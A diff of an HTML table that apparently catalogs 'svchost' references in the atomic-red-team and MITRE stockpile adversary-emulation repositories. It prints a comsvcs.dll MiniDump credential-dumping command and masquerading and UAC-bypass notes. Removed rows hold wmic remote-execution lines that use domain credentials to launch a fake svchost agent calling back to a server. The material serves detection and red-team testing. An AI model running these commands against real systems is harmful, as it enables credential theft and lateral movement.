+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md">T1003.md</a></td>
+      <td>C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md">T1003.md</a></td>
+      <td>Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore</td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
     </tr>
     <tr>
@@ -664,7 +826,13 @@
     <tr>
       <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md">T1036.003.md</a></td>
-      <td>| outputfile | path of file to execute | path | ($env:TEMP + “\svchost.exe”)|</td>
+      <td>| outputfile | path of file to execute | Path | ($env:TEMP + “\svchost.exe”)|</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.005/T1036.005.md">T1036.005.md</a></td>
+      <td>&lt;blockquote&gt;Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.</td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
     </tr>
     <tr>
@@ -754,7 +922,13 @@
     <tr>
       <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md">T1218.md</a></td>
-      <td>| renamed_binary | renamed Microsoft.Workflow.Compiler | path | PathToAtomicsFolder\T1218\src\svchost.exe|</td>
+      <td>| renamed_binary | renamed Microsoft.Workflow.Compiler | Path | PathToAtomicsFolder\T1218\src\svchost.exe|</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md">T1548.002.md</a></td>
+      <td>Target:	\system32\svchost.exe via \system32\schtasks.exe</td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
     </tr>
     <tr>
@@ -1049,24 +1223,6 @@
       <td><a href="https://github.com/mitre/stockpile">stockpile</a></td>
       <td><a href="https://github.com/mitre/stockpile/blob/master/data/abilities/discovery/05cda6f6-2b1b-462e-bff1-845af94343f7.yml">05cda6f6-2b1b-462e-bff1-845af94343f7.yml</a></td>
       <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq "svchost") {$p} };</span></code></td>
-      <td><a href="https://github.com/mitre/stockpile/blob/master/LICENSE">Apache-2.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/mitre/stockpile">stockpile</a></td>
-      <td><a href="https://github.com/mitre/stockpile/blob/master/data/abilities/execution/2a32e46f-5346-45d3-9475-52b857c05342.yml">2a32e46f-5346-45d3-9475-52b857c05342.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create "powershell.exe C:\Users\Public\svchost.exe -server</span> <span class="c1">#{server}";</span></code></td>
-      <td><a href="https://github.com/mitre/stockpile/blob/master/LICENSE">Apache-2.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/mitre/stockpile">stockpile</a></td>
-      <td><a href="https://github.com/mitre/stockpile/blob/master/data/abilities/execution/2a32e46f-5346-45d3-9475-52b857c05342.yml">2a32e46f-5346-45d3-9475-52b857c05342.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where "ExecutablePath='C:\\Users\\Public\\svchost.exe'" call terminate;</span></code></td>
-      <td><a href="https://github.com/mitre/stockpile/blob/master/LICENSE">Apache-2.0</a></td>
-    </tr>
-    <tr>
-      <td><a href="https://github.com/mitre/stockpile">stockpile</a></td>
-      <td><a href="https://github.com/mitre/stockpile/blob/master/data/abilities/execution/2a32e46f-5346-45d3-9475-52b857c05342.yml">2a32e46f-5346-45d3-9475-52b857c05342.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create "cmd.exe /c C:\Users\Public\svchost.exe -server</span> <span class="c1">#{server}";</span></code></td>
       <td><a href="https://github.com/mitre/stockpile/blob/master/LICENSE">Apache-2.0</a></td>
     </tr>
     <tr>
